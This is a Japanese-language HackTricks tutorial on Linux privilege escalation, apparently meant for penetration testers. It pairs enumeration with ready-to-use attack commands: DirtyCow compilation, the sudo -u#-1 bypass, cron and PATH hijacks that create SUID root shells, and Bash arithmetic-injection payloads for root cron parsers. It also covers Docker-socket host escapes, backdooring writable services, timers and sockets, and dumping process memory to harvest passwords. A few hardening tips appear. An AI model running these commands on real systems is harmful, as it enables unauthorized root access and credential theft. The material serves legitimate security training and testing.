# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

稼働しているOSについての情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし**`PATH`内の任意のフォルダに書き込み権限がある**場合、いくつかのlibrariesやbinariesをhijackできる可能性があります:
```bash
echo $PATH
```
### Env info

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、escalate privileges に使用できる exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストと既に **compiled exploits** はここで見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他 **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトから脆弱なカーネルの全バージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploitsを検索するのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim上で実行、kernel 2.x のexploitsのみチェック)

常に**カーネルのバージョンをGoogleで検索**してください。カーネルのバージョンが既知のkernel exploitに記載されている場合、そのexploitが有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

次に示される脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱か確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) は、ユーザが制御するディレクトリから `/etc/nsswitch.conf` ファイルが使用される場合、sudo `--chroot` オプションを介して権限のないローカルユーザが root に権限昇格できる可能性があります。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗しました

**smasher2 box of HTB** を確認してください。この vuln がどのように悪用され得るかの**例**が示されています。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらにシステムの列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container 内にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**what is mounted and unmounted** がどこにあるか、なぜそうなっているかを確認してください。もし何かが unmounted になっている場合は、それを mount して機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**を確認してください。これは、いくつかのカーネルエクスプロイトを使用する必要がある場合に役立ちます。使用するマシン（またはそれに類似したマシン）でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール

インストールされている**パッケージおよびサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、権限昇格に悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンに SSH アクセスがある場合、マシン内にインストールされている古いまたは脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドは多くの情報を表示し、そのほとんどは役に立たないため、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックする OpenVAS のようなアプリケーションを使用することを推奨します_

## プロセス

どの **プロセス** が実行されているかを確認し、どのプロセスが本来よりも **多くの権限を持っているか** をチェックしてください（例えば tomcat が root で実行されているなど）
```bash
ps aux
ps -ef
top -n 1
```
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) を確認してください。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックしてそれらを検出します。\
また、プロセスのバイナリに対する **privileges** を確認してください。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使ってプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されている場合や、特定の条件が満たされたときに実行されるプロセスを特定するのに非常に有用です。

### Process memory

サーバーのいくつかのサービスは **メモリ内に平文で credentials を保存する** ことがあります。\
通常、他のユーザーに属するプロセスのメモリを読むには **root privileges** が必要になるため、これは既に root の場合にさらに認証情報を発見したいときに有用です。\
ただし、**通常ユーザーとして自分が所有するプロセスのメモリは読むことができる** ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であれば全てのプロセスをデバッグできます。これは ptrace の従来の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE が必要です）。
> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースは禁止されます。一度設定すると、ptrace を再び有効にするには再起動が必要です。

#### GDB

例えば FTP サービスのメモリにアクセスできれば、ヒープを取得してその中の認証情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDについて、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示します**。また、**各マップ領域の権限** も表示します。  
**mem** 疑似ファイルは **プロセスのメモリ自体を公開します**。  
**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそのオフセットが分かります。  
この情報を使って、**mem ファイル内をシークして読み取り可能な領域をすべてダンプする** ことで、それらをファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリにアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem`は**root**と**kmem**グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows向けのSysinternalsスイートにある古典的なProcDumpツールをLinux向けに再構想したものです。入手はこちら [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root要件を手動で削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### Credentials from Process Memory

#### 手動の例

authenticatorプロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
process を dump し（前のセクションを参照して、その process の memory を dump するさまざまな方法を確認してください）memory 内で credentials を検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の資格情報を盗み**、またいくつかの**よく知られているファイル**からも取得します。正常に動作するには root 権限が必要です。

| 機能                                           | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - sudo 使用)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron ジョブ

### Crontab UI (alseambusher) が root で動作している — webベースのスケジューラ privesc

もし web “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、ループバックにのみバインドされている場合でも、SSH ローカルポートフォワーディング経由で到達して、特権ジョブを作成して権限昇格できます。

典型的なチェーン
- ループバックのみのポート（例: 127.0.0.1:8000）と Basic-Auth の realm を `ss -ntlp` / `curl -v localhost:8000` で発見する
- 運用アーティファクト内で認証情報を探す:
  - バックアップ/スクリプトで `zip -P <password>`
  - systemd ユニットで `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` が設定されている場合
- トンネルを張ってログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成して即実行する（SUID shell をドロップする）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使い方:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root で実行しない; 専用ユーザーと最小権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードを使い回さない
- unit files にシークレットを埋め込まない; secret stores か root-only EnvironmentFile を使用する
- on-demand ジョブ実行のために audit/logging を有効化する



スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを利用できる可能性がある（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使えるか? root が使用するディレクトリに特定のファイルを作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中で次のような PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注: ユーザ "user" が /home/user に書き込み権限を持っていることに注意_)

もしこの crontab の中で root ユーザが PATH を設定せずにコマンドやスクリプトを実行しようとすると。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを含むスクリプトを使用する Cron (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、予期しない動作（privesc のような）を引き起こすように悪用できます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **、脆弱ではありません（_**./\***_**も同様です）。**

より詳しい wildcard exploitation tricks を知りたい場合は次のページを参照してください:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- なぜ動作するのか: In Bash、展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値 `0` が算術に使われてスクリプトはエラーなく続行します。

- 典型的な脆弱なパターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 悪用方法: パースされるログに攻撃者制御のテキストを書き込み、数値のように見えるフィールドに command substitution が含まれ末尾が数字になるようにします。コマンドは stdout に出力しない（またはリダイレクトする）ようにして、算術評価が有効なままになるようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **cron script** を変更できるなら、簡単に **shell** を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が **あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除して **別のディレクトリへの symlink フォルダを作成する**ことで、あなたが制御するスクリプトを提供できるようになるかもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して権限を昇格できるかもしれません。

例えば、**0.1秒ごとに1分間監視し**、**実行回数の少ない順にソートし**、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のツールも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します).

### 見えない cron ジョブ

cronジョブを作成することが可能で、**コメントの後にキャリッジリターンを入れる**（改行文字なしで）と、cronジョブは動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルに書き込めるか確認してください。書き込みできる場合、**改変して**、サービスが**開始**、**再起動**または**停止**したときにあなたの**backdoor**を**実行させる**ようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\
例えば .service ファイル内にあなたの backdoor を作成するには **`ExecStart=/tmp/script.sh`** を使います。

### 書き込み可能なサービスのバイナリ

サービスによって実行される**バイナリに対して書き込み権限を持っている**場合、それらを backdoors に差し替えることで、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

You can see the PATH used by **systemd** with:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが判明した場合、**escalate privileges**できる可能性があります。サービスの設定ファイルで**relative paths being used on service configurations**のような記述を検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH folder 内に、相対パスのバイナリと同じ名前の **executable** を作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor will be executed**（通常、権限のないユーザーはサービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントを組み込みでサポートしており、非同期で実行できるため、cron の代替として使用できます。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit のいくつか（例えば `.service` や `.target`）を実行させることができる
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが期限切れになったときにアクティベートされるユニット。引数はサフィックスが ".timer" ではないユニット名です。指定しない場合、この値はタイマーユニットと同じ名前（サフィックスを除く）を持つ service にデフォルトされます。（上記参照。）アクティベートされるユニット名とタイマーユニットのユニット名は、サフィックスを除いて同一名にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- systemd ユニット（例: `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスを実行している** systemd ユニットを見つけ、（その実行ファイルをなりすますために）**書き込み権限**を**systemd PATH**に対して持っていること

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、以下を実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます

## Sockets

Unix Domain Sockets (UDS) はクライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準の Unix ディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**詳細は `man systemd.socket` を参照してください。** このファイル内では、いくつか興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットが**どこで待ち受けるかを示す**ために使われます（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 および/またはポート番号など）。
- `Accept`: ブール値の引数を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、すべてのリッスンソケット自体が**起動された service unit に渡され**、すべての接続に対して単一の service unit のみが生成されます。この値はデータグラムソケットおよび FIFO では無視され、これらでは単一の service unit が無条件にすべての着信トラフィックを処理します。**デフォルトは false**。性能上の理由から、新しいデーモンは `Accept=no` に適した方式で作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする **sockets**/FIFOs がそれぞれ**作成され**バインドされる**前**または**後**に実行されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFOs がそれぞれ**閉じられ**削除される**前**または**後**に実行される追加の**コマンド**です。
- `Service`: **incoming traffic** 時に**有効化する** `service` ユニット名を指定します。この設定は `Accept=no` の sockets のみに許可されます。デフォルトではソケットと同じ名前（サフィックスを置き換えたもの）の service が使用されます。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

書き込み可能な `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**でき、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

書き込み可能な socket を**特定**した場合（ここで言っているのは Unix Sockets であり、設定の `.socket` ファイルではありません）、そのソケットと**通信することができ**、脆弱性を悪用できる可能性があります。

### Unix Sockets の列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部の **HTTP リクエストを受け付けている sockets** が存在する可能性があることに注意してください (_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_)。以下のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **HTTP リクエストに応答する** 場合、**通信** が可能になり、場合によっては **exploit some vulnerability**。

### 書き込み可能な Docker ソケット

Docker ソケットは通常 `/var/run/docker.sock` にあり、保護すべき重要なファイルです。デフォルトでは `root` ユーザーおよび `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権限を持つと privilege escalation に繋がる可能性があります。以下はその実行方法と、Docker CLI が利用できない場合の代替手段の内訳です。

#### **Privilege Escalation with Docker CLI**

もし Docker ソケットへの書き込み権限を持っている場合、次のコマンドを使って escalate privileges できます：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスできるコンテナを実行します。

#### **Docker API を直接利用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドで操作可能です。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** コンテナに接続するために `socat` を使用し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後は、ホストのファイルシステムに対して root 権限でコンテナ内から直接コマンドを実行できます。

### Others

docker socket に対して書き込み権限がある（つまり **inside the group `docker`** のメンバーである）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それを悪用できる可能性もあります。

docker から脱出したり悪用して権限昇格するその他の方法については、次を参照してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus はアプリケーション間のやり取りとデータ共有を効率化する高度な **inter-Process Communication (IPC) system** です。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、**enhanced UNIX domain sockets** を思わせる仕組みを提供します。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth daemon からの着信通話に関するシグナルが音楽プレーヤーをミュートさせる、といったユーザー体験の向上が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間でのサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、マッチするポリシールールの累積的効果によりメッセージ許可（メソッド呼び出し、シグナル送出等）を管理します。これらのポリシーは bus とのやり取りを定義しており、これらの許可を悪用することで privilege escalation を引き起こす可能性があります。

例えば `/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーの例では、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージを送受信できる権限が記載されています。

ユーザーやグループが指定されていないポリシーはすべてのユーザーに適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないものすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus通信 を enumerate して exploit する方法を学ぶ:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を特定するのは常に有益です。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセスする前に、それまでやり取りできなかったマシンで稼働しているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff trafficが可能か確認してください。可能であれば、いくつかの認証情報を入手できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

